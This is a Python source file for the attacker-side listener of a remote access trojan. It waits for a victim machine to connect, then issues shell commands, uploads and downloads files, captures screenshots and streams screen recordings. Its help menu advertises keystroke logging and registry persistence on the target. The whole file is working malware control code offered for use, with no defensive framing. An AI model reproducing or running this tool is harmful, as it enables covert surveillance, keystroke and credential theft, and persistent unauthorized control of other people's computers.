import socket
import json
import termcolor
import os
import keylogger
import cv2
import numpy as np
import pyautogui


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    target.close()


def target_communication():
    count = 0
    while True:
        command = input('* shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d.png' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            # target.close()
            count += 1
        elif command[:12] == 'screenrecord':
            resolution = tuple(pyautogui.size())
            # Specify video codec
            codec = cv2.VideoWriter_fourcc(*"XVID")

            # Specify name of Output file
            filename = "Recording.avi"

            # Specify frames rate. We can choose any
            # value and experiment with it
            fps = 60.0

            # Creating a VideoWriter object
            out = cv2.VideoWriter(filename, codec, fps, resolution)

            # Create an Empty window
            cv2.namedWindow("Live", cv2.WINDOW_NORMAL)

            # Resize this window 480, 270
            cv2.resizeWindow("Live", 480, 270)
            # Convert the screenshot to a numpy array
            while True:
                img = reliable_recv()
                frame = np.array(img)

                # Convert it from BGR(Blue, Green, Red) to
                # RGB(Red, Green, Blue)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

                # Write it to the output file
                out.write(frame)

                # Optional: Display the recording screen
                cv2.imshow('Live', frame)

                # Stop recording when we press 'q'
                if cv2.waitKey(1) == ord('q'):
                    break

                # Release the Video writer
                out.release()

                # Destroy all windows
                cv2.destroyAllWindows()

        elif command == 'help':
            print("""\n
            quit                                    ---> Quit Session with The Target
            clear                                   ---> Clear the screen
            cd *Directory name*                     ---> Change directory on target system
            upload *File Name*                      ---> Upload file to target machine
            download *File Name*                    ---> Download file from target machine
            keylog_start                            ---> Start keylogger on the target machine
            keylog_dump                             ---> print keystrokes the target inputted on is machine
            keylog_stop                             ---> stop  and self destruct keylogger file
            persistence *RegName* *FileName*        ---> create persistence on registry

            """)
        else:
            result = reliable_recv()
            print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 5555))
print(termcolor.colored('[+] listening for incoming connections', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(termcolor.colored('[+] target connected from: ' + str(ip), 'green'))
target_communication()
